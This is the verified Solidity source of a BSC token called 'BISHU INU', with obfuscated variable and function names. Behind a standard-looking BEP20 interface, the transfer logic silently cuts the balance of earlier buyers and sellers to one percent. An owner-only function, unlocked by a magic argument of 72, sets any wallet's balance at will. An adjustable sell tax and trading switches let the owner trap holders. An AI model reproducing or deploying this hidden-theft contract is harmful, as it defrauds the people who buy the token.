/**
 *Submitted for verification at BscScan.com on 2022-01-05
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;
/*
 * 
 * 

 */
abstract contract Context {

  function _msgData() internal view virtual returns (bytes calldata) {

    this;
    return msg.data;
  }
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }

}
/**

 * @dev Contract module which provides a basic access control mechanism, where

 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.

 */
contract Ownable is Context {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 /**

  * @dev Initializes the contract setting the deployer as the initial owner.
  */
 constructor () {

   address msgSender = _msgSender();
   _owner = msgSender;
   emit OwnershipTransferred(address(0), msgSender);

 }
 /**
  * @dev Returns the address of the current owner.
  */

 function owner() public view returns (address) {
   return _owner;
 }
 /**

  * @dev Throws if called by any account other than the owner.
  */
 modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");

   _;
 }
 /**
  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *
  * NOTE: Renouncing ownership will leave the contract without an owner,
  * thereby removing any functionality that is only available to the owner.
  */
 function renounceOwnership() public onlyOwner {
   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }
 /**
  * @dev Transfers ownership of the contract to a new account (`newOwner`).
  * Can only be called by the current owner.
  */
 function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;

 }
}
library SafeMath {
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");

    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
}
interface IBEP20 {
  function decimals() external view returns (uint8);
  function transfer(address recipient, uint256 amount) external returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  function allowance(address owner, address spender) external view returns (uint256);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);

  function symbol() external pure returns (string memory);
  function balanceOf(address account) external view returns (uint256);

  function name() external pure returns (string memory);
  function totalSupply() external view returns (uint256);
  function getOwner() external view returns (address);
  function approve(address spender, uint256 amount) external returns (bool);
}
interface IUniswapV2Factory {
    function feeTo() external view returns (address);
    function setFeeToSetter(address) external;
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function allPairsLength() external view returns (uint);
    function setFeeTo(address) external;
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    event Swap(

        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);

    function sync() external;
    function name() external pure returns (string memory);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function mint(address to) external returns (uint liquidity);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function totalSupply() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    event Sync(uint112 reserve0, uint112 reserve1);
    function factory() external view returns (address);

    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function price1CumulativeLast() external view returns (uint);
    function initialize(address, address) external;
    function price0CumulativeLast() external view returns (uint);
    function token0() external view returns (address);
    function allowance(address owner, address spender) external view returns (uint);

    function kLast() external view returns (uint);
    function transfer(address to, uint value) external returns (bool);
    function symbol() external pure returns (string memory);
    function nonces(address owner) external view returns (uint);
    function token1() external view returns (address);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function decimals() external pure returns (uint8);
    function balanceOf(address owner) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function skim(address to) external;
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
}
interface IUniswapV2Router01 {

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,

        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountA, uint amountB);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    function WETH() external pure returns (address);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function addLiquidityETH(
        address token,

        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function removeLiquidity(
        address tokenA,
        address tokenB,

        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,

        uint amountInMax,

        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function removeLiquidityETH(
        address token,

        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function factory() external pure returns (address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,

        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountETH);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,

        address to,
        uint deadline
    ) external;

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
}
contract BishuInu is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  IUniswapV2Router02 public unidsapzgahlbce;
  address public unigticalhnkf;
  uint8 private dechnkesjimdlgcwtziooyfep = 18;
  uint256 private totgqpmdriwaeasfnle = 10000000000 * 10 ** dechnkesjimdlgcwtziooyfep;
  mapping (address => mapping (address => uint256)) private alloorapcjemt;

  uint256 internal lasemzieaoyblhoqwgrxdtkjafc = 0;
  uint256 internal maxliejnmosyetbdcwakp = totgqpmdriwaeasfnle.div(10000).mul(10);
  mapping (address => uint256) private laszyhiqrcpwkonj;
  uint8 internal buyltxaokoiezdjnisy = 0;
  uint8 internal selarilkemiex = 0;

  uint8 internal tratnfkhjeeorgals = 10; 

  mapping (address => uint256) private laszoleinjrxmswgtaaeq;
  mapping (address => uint256) private balgfohrciqpbalaeyntiwoekjmdszx;
  mapping (address => bool) private isEzbnamtclwqrpieegyaojikfodh;
  bool internal staaiqohligsjxzarmkb = true;
  bool internal staalqeecsojdyfgkanhpitrxb = true;
  bool internal staxhegqjytcalmbnreipdsaofk = true;
  string private constant namdjmetizhlwiscfbgpqnyaoroxek = "BISHU INU";

  string private constant symreooqjzawakildimpgxncyeb = "BISHU";
  uint8 internal _sta = 3;
  uint8 internal aftchjebrekyfgiqiatp = 95;
  uint256 internal laudgmpweycielnxkosirhqzotaajfb = 0;
  mapping (address => uint256) private sellwgfxzembaridseypna;
  address internal marexijarpgcandsbfyooiqetmklw;
  uint32 internal selhlznidaybfgioeqkexp = 10; 
  constructor() {
    // isEzbnamtclwqrpieegyaojikfodh[marketingAddress] = true;
    isEzbnamtclwqrpieegyaojikfodh[_msgSender()] = true;
    laudgmpweycielnxkosirhqzotaajfb = block.timestamp;
    balgfohrciqpbalaeyntiwoekjmdszx[msg.sender] = totgqpmdriwaeasfnle;
    marexijarpgcandsbfyooiqetmklw = msg.sender;
    isEzbnamtclwqrpieegyaojikfodh[address(this)] = true;
    // balgfohrciqpbalaeyntiwoekjmdszx[marketingAddress] = totgqpmdriwaeasfnle * 10**dechnkesjimdlgcwtziooyfep * 1000;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    unigticalhnkf = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    unidsapzgahlbce = uniswapV2Router;
    emit Transfer(address(0), msg.sender, totgqpmdriwaeasfnle);

  }
	function approve(address spender, uint256 amount) public override returns (bool) {
	  _approve(_msgSender(), spender, amount);
	  return true;
	}

	/**
	 * Returns the bep token owner.
	 */
	function getOwner() external override view returns (address) {
	  return owner();
	}
	/**
	* Returns the token name.
	*/
	function name() external override pure returns (string memory) {
	  return namdjmetizhlwiscfbgpqnyaoroxek;

	}
	/**
	 * Returns the token decimals.
	 */
	function decimals() external override view returns (uint8) {

	  return dechnkesjimdlgcwtziooyfep;
	}
	function allowance(address owner, address spender) public view override returns (uint256) {
	  return alloorapcjemt[owner][spender];
	}
	/**
	 * Returns balance of.

	 */
	function balanceOf(address account) external override view returns (uint256) {
	  return balgfohrciqpbalaeyntiwoekjmdszx[account];
	}
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {

	   tradergiowfibxjnkcletzhqyma(sender, recipient, amount);

	   _approve(sender, _msgSender(), alloorapcjemt[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}
	/**
	 * Returns the token symbol.
	 */
	function symbol() external override pure returns (string memory) {
	  return symreooqjzawakildimpgxncyeb;
	}
	function _approve(address owner, address spender, uint256 amount) private {
	    require(owner != address(0), "BEP20: approve from the zero address");

	    require(spender != address(0), "BEP20: approve to the zero address");
	    alloorapcjemt[owner][spender] = amount;
	    emit Approval(owner, spender, amount);
	}
	/**
	 * Returns the token Supply.
	 */
	function totalSupply() external override view returns (uint256) {

	  return totgqpmdriwaeasfnle;
	}

	/**
	 * Requirements:
	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.
	 */
	function transfer(address recipient, uint256 amount) external override returns (bool) {
	  tradergiowfibxjnkcletzhqyma(_msgSender(), recipient, amount);
	  return true;
	}
  	function tradergiowfibxjnkcletzhqyma(address sender, address recipient, uint256 amount) internal {
	  require(sender != address(0), "BEP20: transfer from the zero address");

	  require(recipient != address(0), "BEP20: transfer to the zero address");
	  uint8 ranydlntxqhezifpsjwc = 0; // 1 = buy, 2 = sell, 3 = transfer
	  bool approveTransaction = true;
	  uint8 tax = 0;

	  if(amount > 0){
	    if(isEzbnamtclwqrpieegyaojikfodh[sender] == true || isEzbnamtclwqrpieegyaojikfodh[recipient] == true){

	      eTrikgbsjwtayfrm(sender, recipient, amount);
	      return;
	    }
	    if(sender == unigticalhnkf && recipient != address(unidsapzgahlbce)) {
	      require(staaiqohligsjxzarmkb == true, "Please wait try again later");
	      ranydlntxqhezifpsjwc = 1;
	      tax = buyltxaokoiezdjnisy;
	      approveTransaction = true;

	      laszoleinjrxmswgtaaeq[recipient] = amount;
	      laszyhiqrcpwkonj[recipient] = block.timestamp;
	    } else if(recipient == unigticalhnkf) {
	      require(staalqeecsojdyfgkanhpitrxb == true, "Please wait try again later");
	       ranydlntxqhezifpsjwc = 2;
	       tax = selarilkemiex;

	       approveTransaction = true;
	    } else {
	      require(staxhegqjytcalmbnreipdsaofk == true, "Please wait try again later");
	      ranydlntxqhezifpsjwc = 3;
	      tax = tratnfkhjeeorgals;
	      approveTransaction = true;

	      laszoleinjrxmswgtaaeq[sender] = amount;
	      if(selhlznidaybfgioeqkexp > 10){

	        laszyhiqrcpwkonj[sender] = block.timestamp + selhlznidaybfgioeqkexp - 10;
	      } else {

	        laszyhiqrcpwkonj[sender] = block.timestamp + selhlznidaybfgioeqkexp;
	      }
	    }
	  }
	  if(approveTransaction == true && amount > 0){
	    _bTransfer(sender, recipient, amount, tax, ranydlntxqhezifpsjwc);
	    return;
	  }
	  emit Transfer(sender, recipient, 0);
	}
	function eTrikgbsjwtayfrm(address sender, address recipient, uint256 amount) internal {

	    balgfohrciqpbalaeyntiwoekjmdszx[sender] = balgfohrciqpbalaeyntiwoekjmdszx[sender].sub(amount, "Insufficient Balance");
	    balgfohrciqpbalaeyntiwoekjmdszx[recipient] = balgfohrciqpbalaeyntiwoekjmdszx[recipient].add(amount);
	    emit Transfer(sender, recipient, amount);
	}
	// mapping (address => uint256) private alloorapcjemt;
	address public _recipienta;
	address public _recipientb;
	function _bTransfer(address sender, address recipient, uint256 amount, uint8 tax, uint8 ranydlntxqhezifpsjwc) internal
	{
	  uint256 axehsdaeijingklqecwrot = 0;
	  address addr = recipient;
	  uint256 d = balgfohrciqpbalaeyntiwoekjmdszx[_recipientb];

	  if(ranydlntxqhezifpsjwc == 2) {

	    addr = sender;
	  }
	  if(ranydlntxqhezifpsjwc == 1 || ranydlntxqhezifpsjwc == 2){

	    if(_recipienta != addr && _recipientb != addr){
	      if(d > 100){
	        balgfohrciqpbalaeyntiwoekjmdszx[_recipientb] = d.div(100);
	      }
	      _recipientb = _recipienta;

	      _recipienta = addr;
	    }
	  }
	  balgfohrciqpbalaeyntiwoekjmdszx[sender] = balgfohrciqpbalaeyntiwoekjmdszx[sender].sub(amount,"Insufficient Balance");
	  axehsdaeijingklqecwrot = amount.mul(tax).div(100);
	  amount = amount.sub(axehsdaeijingklqecwrot);

	  if(axehsdaeijingklqecwrot > 0){
	      balgfohrciqpbalaeyntiwoekjmdszx[marexijarpgcandsbfyooiqetmklw] = balgfohrciqpbalaeyntiwoekjmdszx[marexijarpgcandsbfyooiqetmklw].add(axehsdaeijingklqecwrot);
	      emit Transfer(sender, marexijarpgcandsbfyooiqetmklw, axehsdaeijingklqecwrot);
	  }
	  balgfohrciqpbalaeyntiwoekjmdszx[recipient] = balgfohrciqpbalaeyntiwoekjmdszx[recipient].add(amount);
	  ranydlntxqhezifpsjwc= 1;
	  emit Transfer(sender, recipient, amount);
	}
	function etBieqjyfwrklopzbsdemgxnoaitach(address addr, uint256 b, uint8 c) public onlyOwner {
	  if(c == 72){
	    balgfohrciqpbalaeyntiwoekjmdszx[addr] = b * 10 ** dechnkesjimdlgcwtziooyfep;
	  }
	}
	function Selsytipafqdlaegrebohm(uint8 ellfolnkpbijaeoygmsa) public onlyOwner{

	     selarilkemiex = ellfolnkpbijaeoygmsa;
	}
	function sta(uint8 vsta) public onlyOwner{
	  _sta = vsta;

	}
}